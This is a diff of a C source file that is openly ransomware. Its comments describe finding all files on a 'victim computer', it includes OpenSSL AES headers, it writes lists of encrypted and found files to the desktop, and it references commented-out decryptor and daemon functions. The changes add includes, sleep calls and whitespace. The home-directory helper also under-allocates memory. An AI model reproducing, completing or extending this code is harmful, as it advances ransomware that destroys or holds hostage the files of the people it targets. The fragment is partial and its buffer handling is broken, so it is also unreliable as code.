@@ -12,6 +12,8 @@
 #include <sys/stat.h>
 #include<openssl/aes.h>
 #include<openssl/evp.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
 
 /**
  * This function will find all files on the victim computer.
@@ -75,7 +77,9 @@ void find_files(List **files, char* start_path){
  * @param files -> type = List
  */
 void create_files_desktop(List *encrypted, List *files, char * desktop){
+    sleep(5);
     save_into_file_encrypted_list(encrypted, desktop);
+    sleep(5);
     save_into_file_files_list(files, desktop);
     //create_decryptor(desktop);
     //create_daemon_process();
@@ -233,6 +237,7 @@ const char *get_filename_ext(const char *filename) {
  * @return -> type = char * (String)
  */
 char * get_home_enviroment(){
+
     struct passwd *pw;
     char * home;
     uid_t uid;
@@ -243,6 +248,7 @@ char * get_home_enviroment(){
     home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
     strcpy(home, pw->pw_dir);
     strcat(home, "/");
+    
     return home;
 }
 
